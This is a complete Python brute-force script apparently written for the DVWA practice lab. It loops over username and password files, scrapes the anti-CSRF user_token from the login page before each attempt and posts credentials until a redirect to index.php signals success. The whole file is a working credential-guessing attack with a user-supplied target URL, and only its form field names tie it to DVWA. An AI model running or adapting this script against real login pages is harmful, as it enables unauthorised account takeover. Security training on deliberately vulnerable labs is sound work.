import requests
from bs4 import BeautifulSoup

def load_list_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def run_brute_force_attack():
    session = requests.Session()

    # Load usernames and passwords from files
    usernames = load_list_from_file('usernames.txt')
    passwords = load_list_from_file('passwords.txt')

    # Base URL for the DVWA brute force page
    base_url = input("Enter the base URL of the DVWA: ")

    for username in usernames:
        for password in passwords:
            # Fetch the login page to initiate a session and capture the user_token for each attempt
            login_url = f"{base_url}/login.php"
            response = session.get(login_url)

            # Use BeautifulSoup to parse the HTML content and extract the user_token
            soup = BeautifulSoup(response.text, 'html.parser')
            user_token = soup.find('input', {'name': 'user_token'})['value']

            data = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': user_token
            }

            # Send the POST request
            response = session.post(login_url, data=data)

            # Output each attempt
            print(f"Trying username: {username}, password: {password}")

            if '/index.php' in response.url:
                print(f'Success! Username: {username}, Password: {password}')
                return

    print('Failed to find the password.')

# Ensure this script does not run when imported as a module
if __name__ == "__main__":
    run_brute_force_attack()